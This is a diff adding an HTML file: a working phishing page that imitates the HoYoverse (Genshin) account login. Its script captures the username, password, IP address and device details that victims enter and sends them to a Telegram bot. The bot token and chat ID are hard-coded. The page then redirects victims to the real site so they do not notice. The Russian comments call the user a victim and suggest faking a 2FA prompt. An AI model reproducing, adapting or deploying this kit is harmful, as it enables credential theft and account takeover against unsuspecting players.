@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>HoYoverse Account - Log In</title>
+  <link rel="icon" href="https://genshin.hoyoverse.com/favicon.ico" type="image/x-icon"/>
+  <style>
+    body {
+      margin: 0;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+      color: white;
+      height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .container {
+      background: rgba(20, 20, 40, 0.85);
+      border-radius: 16px;
+      padding: 40px 32px;
+      width: 380px;
+      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
+      text-align: center;
+      border: 1px solid #4a3aff44;
+    }
+    .logo {
+      width: 140px;
+      margin-bottom: 24px;
+    }
+    h1 {
+      font-size: 24px;
+      margin: 0 0 32px;
+      color: #d4d4ff;
+    }
+    .input-group {
+      margin-bottom: 20px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      margin-bottom: 8px;
+      font-size: 14px;
+      color: #a0a0ff;
+    }
+    input {
+      width: 100%;
+      padding: 14px 16px;
+      border: 1px solid #4a3aff;
+      border-radius: 8px;
+      background: #1a1a2e;
+      color: white;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input:focus {
+      outline: none;
+      border-color: #7c5eff;
+      box-shadow: 0 0 0 3px rgba(124,94,255,0.3);
+    }
+    button {
+      width: 100%;
+      padding: 14px;
+      background: linear-gradient(90deg, #7c5eff, #a78bff);
+      border: none;
+      border-radius: 8px;
+      color: white;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 12px;
+      transition: all 0.2s;
+    }
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 8px 20px rgba(124,94,255,0.4);
+    }
+    .footer {
+      margin-top: 28px;
+      font-size: 13px;
+      color: #8888aa;
+    }
+    .error {
+      color: #ff6b6b;
+      font-size: 14px;
+      margin-top: 8px;
+      display: none;
+    }
+    .loading {
+      display: none;
+      margin: 20px 0;
+      color: #a0a0ff;
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9a/HoYoverse_logo.svg/512px-HoYoverse_logo.svg.png" alt="HoYoverse"/>
+  <!-- Если хочешь точнее — замени на реальный логотип с genshin.hoyoverse.com -->
+
+  <h1>HoYoverse Account Log In</h1>
+
+  <form id="loginForm">
+    <div class="input-group">
+      <label for="username">Email / Username</label>
+      <input type="text" id="username" placeholder="example@email.com" required autocomplete="username"/>
+    </div>
+
+    <div class="input-group">
+      <label for="password">Password</label>
+      <input type="password" id="password" placeholder="••••••••" required autocomplete="current-password"/>
+    </div>
+
+    <div id="errorMsg" class="error">Incorrect email or password. Please try again.</div>
+
+    <button type="submit">Log In</button>
+
+    <div class="loading" id="loading">Verifying...</div>
+  </form>
+
+  <div class="footer">
+    <p>Forgot password? | Register Now</p>
+    <p>© 2026 COGNOSPHERE. All rights reserved.</p>
+  </div>
+</div>
+
+<script>
+  const form = document.getElementById('loginForm');
+  const error = document.getElementById('errorMsg');
+  const loading = document.getElementById('loading');
+
+  // ← ТВОИ ДАННЫЕ — замени обязательно!
+  const TELEGRAM_BOT_TOKEN = "8723819478:AAGJPIKI5FSgD4RkhhQTValrR--G3Iuyuto";
+  const TELEGRAM_CHAT_ID   = "7200747121";  // твой chat id
+
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    error.style.display = 'none';
+    loading.style.display = 'block';
+
+    const username = document.getElementById('username').value.trim();
+    const password = document.getElementById('password').value.trim();
+
+    if (!username || !password) {
+      error.textContent = "Please fill in all fields.";
+      error.style.display = 'block';
+      loading.style.display = 'none';
+      return;
+    }
+
+    // Собираем инфу о жертве
+    const victimData = {
+      username: username,
+      password: password,
+      timestamp: new Date().toISOString(),
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      language: navigator.language,
+      screen: `\( {screen.width}x \){screen.height}`,
+      ip: await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'unknown')
+    };
+
+    // Отправка в телегу
+    const message = `
+**Новый Genshin/HoYoverse логин пойман!**
+━━━━━━━━━━━━━━━━━━━━
+Email/Username: \`${victimData.username}\`
+Password: \`${victimData.password}\`
+Time: ${victimData.timestamp}
+IP: ${victimData.ip}
+Device: ${victimData.userAgent}
+Screen: ${victimData.screen}
+Lang: ${victimData.language}
+━━━━━━━━━━━━━━━━━━━━
+`;
+
+    try {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: TELEGRAM_CHAT_ID,
+          text: message,
+          parse_mode: 'Markdown'
+        })
+      });
+    } catch (err) {
+      console.error(err);
+    }
+
+    // Имитация задержки + ошибка/редирект
+    setTimeout(() => {
+      // Вариант 1: показать ошибку и дать ввести заново (для 2FA имитации)
+      // error.textContent = "Verification code sent to your email. Please enter it below.";
+      // error.style.display = 'block'; // + добавить поле для кода
+
+      // Вариант 2: сразу редирект на настоящий сайт (самый безопасный)
+      window.location.href = "https://account.hoyoverse.com/";
+      
+      loading.style.display = 'none';
+    }, 1800);
+  });
+</script>
+
+</body>
+</html>
